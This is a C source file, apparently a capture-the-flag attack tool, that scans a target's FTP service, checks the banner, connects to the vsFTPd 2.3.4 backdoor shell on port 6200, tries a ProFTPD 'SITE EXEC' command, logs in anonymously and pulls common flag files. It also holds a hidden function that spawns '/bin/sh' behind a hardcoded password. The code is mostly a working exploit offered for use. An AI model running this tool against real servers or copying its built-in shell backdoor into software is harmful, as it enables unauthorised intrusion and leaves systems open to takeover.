#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>

#define MAX_BUFFER 2048

void hidden() {
    printf("Secret function reached.\n");
    system("/bin/sh");
}

int checkPassword() {
    char pass[16];
    char secret[] = "CTFSecret";
    fgets(pass, sizeof(pass), stdin);
    pass[strcspn(pass, "\n")] = 0;
    if (strcmp(pass, secret) == 0) {
        printf("Access granted.\n");
        hidden();
    } else {
        printf("Access denied.\n");
    }
    return 0;
}

int attemptVSFTPdBackdoor(char *target) {
    int sock;
    struct sockaddr_in addr;
    char buffer[MAX_BUFFER];
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6200);
    addr.sin_addr.s_addr = inet_addr(target);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    memset(buffer, 0, sizeof(buffer));
    write(sock, "id\n", 3);
    read(sock, buffer, sizeof(buffer) - 1);
    if (strstr(buffer, "uid=")) {
        printf("[+] vsFTPd 2.3.4 backdoor confirmed.\n");
        close(sock);
        return 1;
    }
    close(sock);
    return 0;
}

int attemptProFTPDExploit(int sock) {
    char buffer[MAX_BUFFER];
    memset(buffer, 0, sizeof(buffer));
    write(sock, "SITE EXEC id\r\n", 13);
    int len = read(sock, buffer, sizeof(buffer)-1);
    if (len > 0 && strstr(buffer, "uid=")) {
        printf("[+] ProFTPD exploit attempt succeeded.\n");
        return 1;
    }
    return 0;
}

int bannerCheck(const char *banner, char *target, int sock) {
    if (strstr(banner, "vsFTPd 2.3.4")) {
        printf("[!] Potential vsFTPd 2.3.4 backdoor vulnerability.\n");
        if (attemptVSFTPdBackdoor(target)) printf("[*] Backdoor verified.\n");
    } else if (strstr(banner, "ProFTPD")) {
        printf("[!] Potential ProFTPD vulnerabilities.\n");
        attemptProFTPDExploit(sock);
    } else if (strstr(banner, "FileZilla")) {
        printf("[!] FileZilla server detected.\n");
    }
    return 0;
}

int attemptAnonymousLogin(int sock) {
    char buffer[MAX_BUFFER];
    char userCmd[] = "USER anonymous\r\n";
    char passCmd[] = "PASS test\r\n";
    memset(buffer, 0, sizeof(buffer));
    write(sock, userCmd, strlen(userCmd));
    read(sock, buffer, sizeof(buffer) - 1);
    memset(buffer, 0, sizeof(buffer));
    write(sock, passCmd, strlen(passCmd));
    int len = read(sock, buffer, sizeof(buffer) - 1);
    if (len > 0) buffer[len] = '\0';
    if (strstr(buffer, "230")) {
        printf("[+] Anonymous login successful.\n");
        return 1;
    }
    printf("[-] Anonymous login failed.\n");
    return 0;
}

int attemptFlagRetrieval(int sock, const char *filename) {
    char buffer[MAX_BUFFER];
    char retrCmd[128];
    snprintf(retrCmd, sizeof(retrCmd), "RETR %s\r\n", filename);
    memset(buffer, 0, sizeof(buffer));
    write(sock, retrCmd, strlen(retrCmd));
    int len = read(sock, buffer, sizeof(buffer) - 1);
    if (len > 0) {
        buffer[len] = '\0';
        printf("FTP Response: %s\n", buffer);
        if (!strstr(buffer, "550")) {
            printf("[+] Possible flag data received in %s.\n", filename);
            return 1;
        }
    }
    return 0;
}

int attemptCommonFlagFiles(int sock) {
    const char *commonFlags[] = {
        "flag.txt", "flag", "ctf.txt", "ctf_flag.txt", "readme.txt",
        "flag1.txt", "flag2.txt", "proof.txt", "proof_of_concept.txt"
    };
    int i;
    for (i = 0; i < (int)(sizeof(commonFlags)/sizeof(commonFlags[0])); i++) {
        if (attemptFlagRetrieval(sock, commonFlags[i])) return 1;
    }
    return 0;
}

int ftpScan(char *target) {
    int sock;
    struct sockaddr_in addr;
    char buffer[MAX_BUFFER];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(21);
    addr.sin_addr.s_addr = inet_addr(target);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    memset(buffer, 0, sizeof(buffer));
    if (read(sock, buffer, sizeof(buffer) - 1) <= 0) {
        perror("banner read");
        close(sock);
        return -1;
    }
    printf("[*] Banner: %s\n", buffer);
    bannerCheck(buffer, target, sock);

    if (attemptAnonymousLogin(sock)) {
        attemptCommonFlagFiles(sock);
    }

    close(sock);
    return 0;
}

int main(int argc, char *argv[]) {
    char buf[32];
    if (argc > 1) {
        ftpScan(argv[1]);
    }
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    printf("Data: %s\n", buf);
    printf("Guess the password:\n");
    checkPassword();
    return 0;
}